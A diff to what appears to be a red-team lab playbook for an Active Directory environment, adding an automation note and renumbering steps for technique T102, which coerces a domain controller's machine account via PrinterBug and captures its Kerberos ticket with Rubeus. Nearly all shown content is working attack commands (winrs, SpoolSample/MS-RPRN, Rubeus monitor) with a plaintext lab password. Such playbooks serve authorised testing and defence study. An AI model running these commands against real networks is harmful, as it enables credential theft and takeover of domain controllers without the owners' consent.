@@ -28,6 +28,10 @@ In the realistic multi-hop flow, **coercion runs from mbr01, not from Kali**. Af
 
 #### T102 — Coerce dc02$ to mbr01 from the mbr01 beachhead
 
+**Automation:** `attack-matrix/04-automation/linux/campaign-a/T102-coerce-dc02-ws01.sh` stages `campaign-a-t102-coerce-dc02.ps1` on `ws01` and runs it as `analyst_t1` via WinRM. The script copies `Rubeus.exe` and `SpoolSample.exe` from `ws01` to `mbr01`, starts `Rubeus monitor` as a background process, triggers `SpoolSample`, and pulls the monitor/spool logs back to `ws01`. Status: script created; execution paused pending user review.
+
+**Manual run:**
+
 **Step 1 — From `ws01`, copy Rubeus to `mbr01` via SMB (T1570) then start the monitor over WinRS:**
 
 ```powershell
@@ -41,13 +45,13 @@ Copy-Item -Path 'C:\Tools\cadre-attack\Rubeus.exe' -Destination '\\mbr01.child.c
 winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\cadre-attack\Rubeus.exe monitor /targetuser:DC02$ /interval:5 /filtername:DC02$ /output:C:\Tools\cadre-attack\dc02_tgs.txt"
 ```
 
-**Step 3 — Trigger PrinterBug from mbr01 against dc02:**
+**Step 2 — Trigger PrinterBug from mbr01 against dc02:**
 
 ```powershell
 winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\MS-RPRN.exe \\dc02.child.cadre.local \\mbr01.child.cadre.local"
 ```
 
-**Step 4 — Collect the captured TGS on mbr01:**
+**Step 3 — Collect the captured TGS on mbr01:**
 
 ```powershell
 winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "Get-Content C:\Tools\cadre-attack\dc02_tgs.txt"
